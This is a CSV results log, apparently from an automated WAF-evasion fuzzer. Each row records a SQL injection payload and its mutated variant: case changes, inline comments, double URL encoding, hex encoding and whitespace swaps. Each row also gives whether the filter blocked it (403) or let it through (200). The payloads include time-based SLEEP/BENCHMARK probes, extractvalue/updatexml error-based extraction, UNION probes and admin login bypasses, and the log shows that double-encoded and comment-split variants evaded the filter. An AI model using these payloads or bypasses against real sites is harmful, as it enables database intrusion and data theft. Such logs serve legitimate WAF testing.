depth,category,label,reason,confidence,status,length,elapsed,input_preview,parent_preview
1,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00371,1 AnD SlEeP(5),1 AND SLEEP(5)
1,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4559,0.00522,1 AN/**/D SL/**/EEP(5),1 AND SLEEP(5)
1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4574,0.00553,1%2527%2520AND%2520SLEEP%25285%2529--,1' AND SLEEP(5)--
1,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00532,1' %41ND S%4cEEP(5)--,1' AND SLEEP(5)--
1,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00323,"1'+AND
SLEEP(5)--",1' AND SLEEP(5)--
1,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00292,1' aNd sLeEp(5)--,1' AND SLEEP(5)--
1,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,182,0.00492,1' AN/**/D SL/**/EEP(5)--,1' AND SLEEP(5)--
1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4566,0.00599,1%2520OR%2520SLEEP%25285%2529,1 OR SLEEP(5)
1,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00351,1 O%52 S%4cE%45P(5),1 OR SLEEP(5)
1,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00302,1+OR SLEEP(5),1 OR SLEEP(5)
1,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.0031,1 Or sLeEp(5),1 OR SLEEP(5)
1,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4558,0.00544,1 O/**/R SLEE/**/P(5),1 OR SLEEP(5)
1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4576,0.00492,1%2529%2520OR%2520SLEEP%25285%2529%2523,1) OR SLEEP(5)#
1,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00312,1) %4fR %53LE%45%50(5)#,1) OR SLEEP(5)#
1,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00316,1) OR+SLEEP(5)#,1) OR SLEEP(5)#
1,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.0034,1) oR SlEeP(5)#,1) OR SLEEP(5)#
1,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4560,0.00552,1) O/**/R SLE/**/EP(5)#,1) OR SLEEP(5)#
1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4597,0.00492,1%2520AND%2520IF%25281%253D1%252CSLEEP%25285%2529%252C0%2529,"1 AND IF(1=1,SLEEP(5),0)"
1,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00316,"1 AND I%46(1=1,SL%45EP(5),0)","1 AND IF(1=1,SLEEP(5),0)"
1,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00399,"1%09AND+IF(1=1,SLEEP(5),0)","1 AND IF(1=1,SLEEP(5),0)"
1,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00448,"1 AnD If(1=1,sLeEp(5),0)","1 AND IF(1=1,SLEEP(5),0)"
1,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4569,0.00503,"1 AN/**/D IF(1=1,SLEE/**/P(5),0)","1 AND IF(1=1,SLEEP(5),0)"
1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4621,0.00514,1%2520AND%2520extractvalue%25281%252Cconcat%25280x7e%252Cversion%2528%2529%2529%2529,"1 AND extractvalue(1,concat(0x7e,version()))"
1,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00322,"1 A%4eD %65xt%72a%63t%76%61%6cue(1,%63on%63%61t(0x7e,ver%73%69on()))","1 AND extractvalue(1,concat(0x7e,version()))"
1,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00362,"1%0aAND extractvalue(1,concat(0x7e,version()))","1 AND extractvalue(1,concat(0x7e,version()))"
1,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00321,"1 AnD ExTrAcTvAlUe(1,cOnCaT(0x7e,vErSiOn()))","1 AND extractvalue(1,concat(0x7e,version()))"
1,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4597,0.00494,"1 A/**/ND extractvalu/**/e(1,conca/**/t(0x7e,ver/**/sion()))","1 AND extractvalue(1,concat(0x7e,version()))"
1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4690,0.00581,1%2520AND%2520extractvalue%25281%252Cconcat%25280x7e%252C%2528SELECT%2520table_name%2520FROM%2520information_schema.tabl,"1 AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)))"
1,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.0031,"1 %41ND ex%74%72%61ctva%6cu%65(1,co%6ec%61%74(0x7e,(SE%4cECT t%61b%6ce_%6e%61%6de %46ROM info%72ma%74io%6e_s%63%68em%61.","1 AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)))"
1,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00399,"1/**/AND+extractvalue(1,concat(0x7e,(SELECT/**/table_name+FROM information_schema.tables+LIMIT%091)))","1 AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)))"
1,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00319,"1 AnD ExTrAcTvAlUe(1,cOnCaT(0x7e,(SeLeCt tAbLe_nAmE FrOm iNfOrMaTiOn_sChEmA.TaBlEs lImIt 1)))","1 AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)))"
1,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4658,0.00551,"1 AN/**/D extractval/**/ue(1,con/**/cat(0x7e,(SELE/**/CT table_name FR/**/OM i/**/nformation_schema.tables L/**/IMIT 1))","1 AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)))"
1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4624,0.00532,1%2520AND%2520updatexml%25281%252Cconcat%25280x7e%252Cversion%2528%2529%2529%252C1%2529,"1 AND updatexml(1,concat(0x7e,version()),1)"
1,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.0031,"1 %41ND up%64a%74ex%6d%6c(1,%63o%6ec%61t(0x7%65,%76%65rs%69%6fn()),1)","1 AND updatexml(1,concat(0x7e,version()),1)"
1,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00357,"1 AND	updatexml(1,concat(0x7e,version()),1)","1 AND updatexml(1,concat(0x7e,version()),1)"
1,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00301,"1 AnD UpDaTeXmL(1,CoNcAt(0X7E,VeRsIoN()),1)","1 AND updatexml(1,concat(0x7e,version()),1)"
1,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4596,0.00562,"1 A/**/ND upd/**/atexml(1,con/**/cat(0x7e,versi/**/on()),1)","1 AND updatexml(1,concat(0x7e,version()),1)"
1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4766,0.0069,1%2520AND%2520%2528SELECT%25201%2520FROM%2528SELECT%2520COUNT%2528%252A%2529%252CCONCAT%2528version%2528%2529%252CFLOOR%,"1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)"
1,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00374,"1 %41%4eD (S%45LE%43T 1 FRO%4d(SE%4cECT CO%55%4e%54(*),CO%4eCAT(versi%6fn(),FLOOR(%52A%4eD(0)*2))%78 FROM %69%6efor%6d%6","1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)"
1,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00371,"1/**/AND+(SELECT	1%09FROM(SELECT%0aCOUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM+information_schema.tables+GROUP BY
","1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)"
1,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00428,"1 AnD (sElEcT 1 FrOm(sElEcT CoUnT(*),cOnCaT(VeRsIoN(),FlOoR(RaNd(0)*2))x fRoM InFoRmAtIoN_ScHeMa.tAbLeS GrOuP By x)a)","1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)"
1,evasion_comment_insert,FILTERED,SIGNATURE_MATCHED_SQLI_PATTERN,0.95,403,146,0.00399,"1 A/**/ND (SELE/**/CT 1 FRO/**/M(SE/**/LECT COUN/**/T(*),CON/**/CAT(vers/**/ion(),FLOOR(RAND(0)*2))x FRO/**/M i/**/nform","1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)"
1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4626,0.00607,1%2520AND%2520%2528SELECT%2520SUBSTRING%2528version%2528%2529%252C1%252C1%2529%2529%253D5,"1 AND (SELECT SUBSTRING(version(),1,1))=5"
1,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.0031,"1 %41%4e%44 (%53%45%4cE%43T S%55B%53TR%49%4eG(vers%69on(),1,1))=5","1 AND (SELECT SUBSTRING(version(),1,1))=5"
1,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00344,"1 AND
(SELECT%09SUBSTRING(version(),1,1))=5","1 AND (SELECT SUBSTRING(version(),1,1))=5"
1,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00329,"1 AnD (sElEcT SuBsTrInG(VeRsIoN(),1,1))=5","1 AND (SELECT SUBSTRING(version(),1,1))=5"
1,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4594,0.00564,"1 AN/**/D (S/**/ELECT SUBSTRIN/**/G(versi/**/on(),1,1))=5","1 AND (SELECT SUBSTRING(version(),1,1))=5"
1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4640,0.00555,1%2520AND%2520ascii%2528substring%2528%2528SELECT%2520user%2528%2529%2529%252C1%252C1%2529%2529%253E100,"1 AND ascii(substring((SELECT user()),1,1))>100"
1,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00322,"1 AND as%63%69i(subst%72i%6e%67((S%45LECT user()),1,1))>100","1 AND ascii(substring((SELECT user()),1,1))>100"
1,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00289,"1 AND%09ascii(substring((SELECT user()),1,1))>100","1 AND ascii(substring((SELECT user()),1,1))>100"
1,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00389,"1 AnD AsCiI(SuBsTrInG((sElEcT UsEr()),1,1))>100","1 AND ascii(substring((SELECT user()),1,1))>100"
1,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4604,0.00635,"1 AN/**/D a/**/scii(substrin/**/g((S/**/ELECT us/**/er()),1,1))>100","1 AND ascii(substring((SELECT user()),1,1))>100"
1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4637,0.00486,1%2520AND%2520%2528SELECT%2520COUNT%2528%252A%2529%2520FROM%2520information_schema.tables%2529%253E0,1 AND (SELECT COUNT(*) FROM information_schema.tables)>0
1,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00321,1 %41%4e%44 (%53%45%4c%45C%54 CO%55NT(*) F%52OM %69%6e%66o%72ma%74io%6e_sche%6da.tabl%65s)>0,1 AND (SELECT COUNT(*) FROM information_schema.tables)>0
1,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00302,1 AND (SELECT COUNT(*)%0aFROM information_schema.tables)>0,1 AND (SELECT COUNT(*) FROM information_schema.tables)>0
1,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00388,1 AnD (sElEcT CoUnT(*) fRoM InFoRmAtIoN_ScHeMa.tAbLeS)>0,1 AND (SELECT COUNT(*) FROM information_schema.tables)>0
1,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4613,0.00642,1 A/**/ND (SEL/**/ECT COUN/**/T(*) FR/**/OM i/**/nformation_schema.tables)>0,1 AND (SELECT COUNT(*) FROM information_schema.tables)>0
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4549,0.0056,1 ORDER BY 1,1 ORDER BY 1
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4550,0.00532,1 ORDER BY 1 ,1 ORDER BY 1
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4549,0.00525,1 order by 1,1 ORDER BY 1
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4550,0.00456,1 ORDER BY 10,1 ORDER BY 10
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4551,0.00537,1 ORDER BY 10 ,1 ORDER BY 10
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4550,0.00517,1 order by 10,1 ORDER BY 10
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4553,0.00511,"1 GROUP BY 1,2,3","1 GROUP BY 1,2,3"
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4554,0.00507,"1 GROUP BY 1,2,3 ","1 GROUP BY 1,2,3"
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4553,0.00538,"1 group by 1,2,3","1 GROUP BY 1,2,3"
1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4595,0.00512,1%2520OR%2520BENCHMARK%25285000000%252CMD5%25281%2529%2529,"1 OR BENCHMARK(5000000,MD5(1))"
1,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00301,"1 %4f%52 %42EN%43%48%4d%41RK(5000000,MD5(1))","1 OR BENCHMARK(5000000,MD5(1))"
1,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00322,"1
OR+BENCHMARK(5000000,MD5(1))","1 OR BENCHMARK(5000000,MD5(1))"
1,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00482,"1 Or bEnChMaRk(5000000,mD5(1))","1 OR BENCHMARK(5000000,MD5(1))"
1,evasion_comment_insert,FILTERED,SIGNATURE_MATCHED_SQLI_PATTERN,0.95,403,146,0.00387,"1 O/**/R BENCHMA/**/RK(5000000,MD5(1))","1 OR BENCHMARK(5000000,MD5(1))"
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4541,0.00497,1%00,1%00
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4542,0.00502,1%00 ,1%00
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4545,0.00591,1 OR 1=1,1 OR 1=1
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4546,0.00507,1 OR 1=1 ,1 OR 1=1
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4545,0.00564,1 or 1=1,1 OR 1=1
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4547,0.00516,1 OR 1=1  ,1 OR 1=1 
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4546,0.00525,1 or 1=1 ,1 OR 1=1 
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4546,0.00547,1 AND 1=1,1 AND 1=1
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4547,0.00526,1 AND 1=1 ,1 AND 1=1
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4546,0.00493,1 and 1=1,1 AND 1=1
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4548,0.00505,1 AND 1=1  ,1 AND 1=1 
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4547,0.00638,1 and 1=1 ,1 AND 1=1 
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4546,0.00469,1 AND 1=0,1 AND 1=0
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4547,0.0049,1 AND 1=0 ,1 AND 1=0
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4546,0.00519,1 and 1=0,1 AND 1=0
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4548,0.00582,1 AND 1=0  ,1 AND 1=0 
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4547,0.00507,1 and 1=0 ,1 AND 1=0 
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4826,0.00501,1' OR '1'='1,1' OR '1'='1
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4831,0.00521,1' OR '1'='1 ,1' OR '1'='1
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4826,0.0052,1' or '1'='1,1' OR '1'='1
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4836,0.00542,1' OR '1'='1  ,1' OR '1'='1 
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4831,0.00536,1' or '1'='1 ,1' OR '1'='1 
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4550,0.00612,1' AND '1'='1,1' AND '1'='1
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4551,0.00544,1' AND '1'='1 ,1' AND '1'='1
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4550,0.00539,1' and '1'='1,1' AND '1'='1
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4552,0.00551,1' AND '1'='1  ,1' AND '1'='1 
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4551,0.00485,1' and '1'='1 ,1' AND '1'='1 
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,160,0.00508,' OR 1=1,' OR 1=1
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,160,0.00518,' OR 1=1 ,' OR 1=1
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,160,0.0054,' or 1=1,' OR 1=1
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,160,0.00482,' OR 1=1  ,' OR 1=1 
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,160,0.00461,' or 1=1 ,' OR 1=1 
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4821,0.00477,' OR '1'='1,' OR '1'='1
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4826,0.00505,' OR '1'='1 ,' OR '1'='1
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4821,0.00533,' or '1'='1,' OR '1'='1
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4831,0.0051,' OR '1'='1  ,' OR '1'='1 
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4826,0.00514,' or '1'='1 ,' OR '1'='1 
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4846,0.00472,admin' OR '1'='1,admin' OR '1'='1
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4851,0.00472,admin' OR '1'='1 ,admin' OR '1'='1
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4846,0.00518,ADMIN' OR '1'='1,admin' OR '1'='1
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4846,0.0049,admin' or '1'='1,admin' OR '1'='1
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4856,0.00519,admin' OR '1'='1  ,admin' OR '1'='1 
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4851,0.00475,ADMIN' OR '1'='1 ,admin' OR '1'='1 
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4851,0.0046,admin' or '1'='1 ,admin' OR '1'='1 
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4861,0.00473,x' OR 1=1 OR 'x'='y,x' OR 1=1 OR 'x'='y
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4866,0.00487,x' OR 1=1 OR 'x'='y ,x' OR 1=1 OR 'x'='y
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4861,0.0052,X' OR 1=1 OR 'X'='Y,x' OR 1=1 OR 'x'='y
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4861,0.00486,x' or 1=1 or 'x'='y,x' OR 1=1 OR 'x'='y
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4871,0.00579,x' OR 1=1 OR 'x'='y  ,x' OR 1=1 OR 'x'='y 
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4866,0.00497,X' OR 1=1 OR 'X'='Y ,x' OR 1=1 OR 'x'='y 
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4866,0.00593,x' or 1=1 or 'x'='y ,x' OR 1=1 OR 'x'='y 
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4571,0.00615,1%2520UNION%2520SELECT%25201%252C2,1%2520UNION%2520SELECT%25201%252C2
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4572,0.0065,1%2520UNION%2520SELECT%25201%252C2 ,1%2520UNION%2520SELECT%25201%252C2
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4571,0.0057,1%2520union%2520select%25201%252c2,1%2520UNION%2520SELECT%25201%252C2
2,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4595,0.00607,1%2520U%25254eION%2520SE%25254c%252545%252543T%25201%252C2,"1 U%4eION SE%4c%45%43T 1,2"
2,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00292,"1+U%4eION/**/SE%4c%45%43T 1,2","1 U%4eION SE%4c%45%43T 1,2"
2,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.0029,"1 U%4eIoN Se%4C%45%43t 1,2","1 U%4eION SE%4c%45%43T 1,2"
2,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.003,"1 U%4eION SE%4c%45%43%54 1,2","1 U%4eION SE%4c%45%43T 1,2"
2,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4577,0.00547,1%25250aUNION%252509SELECT%2525091%252C2,"1%0aUNION%09SELECT%091,2"
2,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00352,"1%0aUnIoN%09SeLeCt%091,2","1%0aUNION%09SELECT%091,2"
2,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00329,"1%0aU%4e%49ON%09S%45LECT%091,2","1%0aUNION%09SELECT%091,2"
2,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4571,0.00517,1%2520UnIoN%2520SeLeCt%25201%252C2,"1 UnIoN SeLeCt 1,2"
2,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4563,0.00801,"1 Un/**/IoN S/**/eLeCt 1,2","1 UnIoN SeLeCt 1,2"
2,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00305,"1 %55%6e%49%6f%4e %53%65LeC%74 1,2","1 UnIoN SeLeCt 1,2"
